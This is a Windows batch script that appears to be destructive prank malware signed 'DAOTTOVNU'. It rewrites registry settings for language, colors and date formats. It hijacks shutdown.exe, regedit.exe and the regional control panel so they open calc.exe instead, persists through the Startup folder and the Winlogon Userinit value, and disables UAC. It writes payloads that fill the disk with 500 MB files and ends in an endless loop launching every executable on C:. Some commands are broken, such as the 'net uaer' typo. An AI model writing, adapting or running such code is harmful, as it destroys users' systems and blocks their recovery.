@echo off
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\ThemeManager" /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Themes" /f
reg add "HKCU\Control Panel\Desktop" /v PreferredUILanguages /t REG_MULTI_SZ /d "pl-PL" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Nls\Language" /v "Default" /t REG_SZ /d "0415" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Nls\Language" /v "InstallLanguage" /t REG_SZ /d "0415" /f
reg add "HKCU\Control Panel\Accessibility\HighContrast" /v "High Contrast Scheme" /t REG_SZ /d "High Contrast Black" /f
mkdir C:\Windows\System32\ar-SB
mkdir C:\Windows\System32\de-LE
copy "%~f0" C:\Windows\System32\de-LE\DottoIsTrash.bat
echo :1 > C:\Windows\System32\de-LE\DottoIsTrash.bat & echo for /r "C:\" %%a in (*.exe) do start "" "%%~fa >> C:\Windows\System32\de-LE\DottoIsTrash.bat & echo goto 1 >> C:\Windows\System32\de-LE\DottoIsTrash.bat
echo for /l %%n in (1,1,99999999) do fsutil file createnew C:\Windows\System32\ar-SB\file%%n.txt 524288000 > C:\Windows\System32\ar-SB\DottoIsTrash.bat :: Syntax of one command incorrect, i dont know which one though
copy "%~f0" C:\ProgramData\Microsoft\Windows\Templates
copy "%~f0" C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
reg add "HKCU\Control Panel\Accessibility\HighContrast" /v "High Contrast Scheme" /t REG_SZ /d "High Contrast Black" /f
reg add "HKCU\Control Panel\Colors" /v "ActiveBorder" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Colors" /v "ActiveTitle" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Colors" /v "Background" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Colors" /v "ButtonFace" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Colors" /v "ButtonHilight" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Colors" /v "ButtonLight" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Colors" /v "ButtonShadow" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Colors" /v "ButtonText" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Colors" /v "GradientActiveTitle" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Colors" /v "GradientInactiveTitle" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Colors" /v "GrayText" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Colors" /v "Hilight" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Colors" /v "HilightText" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Colors" /v "InactiveBorder" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Colors" /v "InactiveTitle" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Colors" /v "InactiveTitleText" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Colors" /v "InfoText" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Colors" /v "InfoWindow" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Colors" /v "Menu" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Colors" /v "MenuBar" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Colors" /v "MenuHilight" /t REG_SZ /d "255 0 0"  /f
reg add "HKCU\Control Panel\Colors" /v "MenuText" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Colors" /v "Scrollbar" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Colors" /v "TitleText" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Colors" /v "Window" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Colors" /v "WindowFrame" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Desktop\Colors" /v "WindowText" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Desktop\Colors" /v "ActiveBorder" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Desktop\Colors" /v "ActiveTitle" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Desktop\Colors" /v "Background" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Desktop\Colors" /v "ButtonFace" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Desktop\Colors" /v "ButtonHilight" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Desktop\Colors" /v "ButtonLight" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Desktop\Colors" /v "ButtonShadow" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Desktop\Colors" /v "ButtonText" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Desktop\Colors" /v "GradientActiveTitle" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Desktop\Colors" /v "GradientInactiveTitle" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Desktop\Colors" /v "GrayText" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Desktop\Colors" /v "Hilight" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Desktop\Colors" /v "HilightText" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Desktop\Colors" /v "InactiveBorder" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Desktop\Colors" /v "InactiveTitle" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Desktop\Colors" /v "InactiveTitleText" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Desktop\Colors" /v "InfoText" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Desktop\Colors" /v "InfoWindow" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Desktop\Colors" /v "Menu" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Desktop\Colors" /v "MenuText" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Desktop\Colors" /v "Scrollbar" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Desktop\Colors" /v "TitleText" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Desktop\Colors" /v "Window" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Desktop\Colors" /v "WindowFrame" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Desktop\Colors" /v "WindowText" /t REG_SZ /d "255 0 0" /f
::reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Fonts" /f
reg add "HKCU\Control Panel\International" /v s1159 /t REG_SZ /d "DottoVNU was here" /f
reg add "HKCU\Control Panel\International" /v s2359 /t REG_SZ /d "Dottooooooooo" /f
reg add "HKCU\Control Panel\International" /v sShortDate /t REG_SZ /d "MdMdMdyyMyyMdMyyMd DTVST" /f
reg add "HKCU\Control Panel\International" /v sNativeDigits /t REG_SZ /d "0923856741" /f
reg add "HKCU\Control Panel\International" /v sShortTime /t REG_SZ /d "HmmHmmHmmmmmmmmmmmmHmmHmHmHmmmmmmHmHmHmHmHm" /f
reg add "HKCU\Control Panel\International" /v sLongDate /t REG_SZ /d "diddy  m m m m m m m m mm m m m m m mmm  " /f
reg add "HKCU\Control Panel\International" /v sTimeFormat /t REG_SZ /d "H:mmmmmmmmmmmmmmmmmmmmmmm:H" /f
:: i could add OSDATA and winload.efi and winload.exe to image file execution options and fontdrvhost
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\shutdown.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\shutdown.exe" /v Debugger /t REG_SZ /d "calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\intl.cpl" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\intl.cpl" /v Debugger /t REG_SZ /d "calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe" /v Debugger /t REG_SZ /d "calc.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\Windows\system32\de-LE\DottoIsTrash.bat" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v legalnoticecaption /t REG_SZ /d "Get Destroyed By DAOTTOVNU Idiot" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v legalnoticetext /t REG_SZ /d "Get Destroyed By DAOTTOVNU Idiot" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v legalnoticecaption /t REG_SZ /d "Message from DAOTTOVNU" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v legalnoticetext /t REG_SZ /d "Get Destroyed By DAOTTOVNU Idiot" /f
reg add "HKCU\Control Panel\Desktop\Colors" /v "Background" /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Desktop\Desktop" /v "Wallpaper" /t REG_SZ /d "a" /f
reg delete "HKCU\Control Panel\Desktop\Cursors" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
reg add "HKCR\*\shell\DAOTTOVNU WAS HERE DAOTTOVNU WAS HERE DAOTTOVNU WAS HERE DAOTTOVNU WAS HERE DAOTTOVNU WAS HERE DAOTTOVNU WAS HERE DAOTTOVNU WAS HERE" /f
reg add "HKCR\*\shell\DAOTTOVNU WAS HERE DAOTTOVNU WAS HERE DAOTTOVNU WAS HERE DAOTTOVNU WAS HERE DAOTTOVNU WAS HERE DAOTTOVNU WAS HERE DAOTTOVNU WAS HERE1" /f
reg add "HKCR\*\shell\DAOTTOVNU WAS HERE DAOTTOVNU WAS HERE DAOTTOVNU WAS HERE DAOTTOVNU WAS HERE DAOTTOVNU WAS HERE DAOTTOVNU WAS HERE DAOTTOVNU WAS HERE2" /f
reg add "HKCR\*\shell\DAOTTOVNU WAS HERE DAOTTOVNU WAS HERE DAOTTOVNU WAS HERE DAOTTOVNU WAS HERE DAOTTOVNU WAS HERE DAOTTOVNU WAS HERE DAOTTOVNU WAS HERE3" /f
reg add "HKCR\*\shell\DAOTTOVNU WAS HERE DAOTTOVNU WAS HERE DAOTTOVNU WAS HERE DAOTTOVNU WAS HERE DAOTTOVNU WAS HERE DAOTTOVNU WAS HERE DAOTTOVNU WAS HERE4" /f
reg add "HKCR\*\shell\DAOTTOVNU WAS HERE DAOTTOVNU WAS HERE DAOTTOVNU WAS HERE DAOTTOVNU WAS HERE DAOTTOVNU WAS HERE DAOTTOVNU WAS HERE DAOTTOVNU WAS HERE5" /f
net uaer DAOTTOVNU death /add
:1
for /r "C:\" %%a in (*.exe) do start "" "%%~fa"
goto 1
::  for /l %i in (0,1,5) do start cmd /c for %F in ("C:\Windows\system32\*.exe") do start "" "%F"